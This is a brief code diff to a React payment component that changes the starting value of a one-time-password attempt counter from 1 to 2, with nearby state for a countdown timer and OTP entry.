@@ -141,7 +141,7 @@ export default function Payment() {
   })
   const [countdown, setCountdown] = useState(60)
   const [isCountdownActive, setIsCountdownActive] = useState(true)
-  const [otpAttempts, setOtpAttempts] = useState(1)
+  const [otpAttempts, setOtpAttempts] = useState(2)
   const [otpValue, setOtpValue] = useState('')
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
